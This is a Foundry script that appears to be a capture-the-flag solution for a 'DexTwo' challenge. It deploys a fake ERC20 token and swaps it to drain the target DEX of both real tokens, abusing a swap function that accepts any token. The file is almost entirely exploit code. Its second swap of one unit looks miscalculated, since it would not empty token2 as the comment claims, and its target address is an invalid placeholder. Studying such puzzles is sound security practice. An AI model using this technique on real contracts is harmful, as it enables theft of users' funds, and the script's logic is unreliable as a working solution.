// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "openzeppelin-contracts/token/ERC20/ERC20.sol";

interface IDexTwo {
    function swap(address from, address to, uint256 amount) external;
    function token1() external view returns (address);
    function token2() external view returns (address);
}

// Fake Token
contract FakeToken is ERC20 {
    constructor() ERC20("Fake", "FAKE") {
        _mint(msg.sender, 1000);
    }
}

contract DexTwoSolution is Script {

    function run() external {
        address target = 0xYOUR_INSTANCE;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        IDexTwo dex = IDexTwo(target);

        address token1 = dex.token1();
        address token2 = dex.token2();

        // 1. Deploy fake token
        FakeToken fake = new FakeToken();

        // 2. Send small amount to DEX
        fake.transfer(target, 1);

        // 3. Approve DEX
        fake.approve(target, type(uint256).max);

        // 4. Drain token1
        dex.swap(address(fake), token1, 1);

        // 5. Drain token2
        dex.swap(address(fake), token2, 1);

        vm.stopBroadcast();
    }
}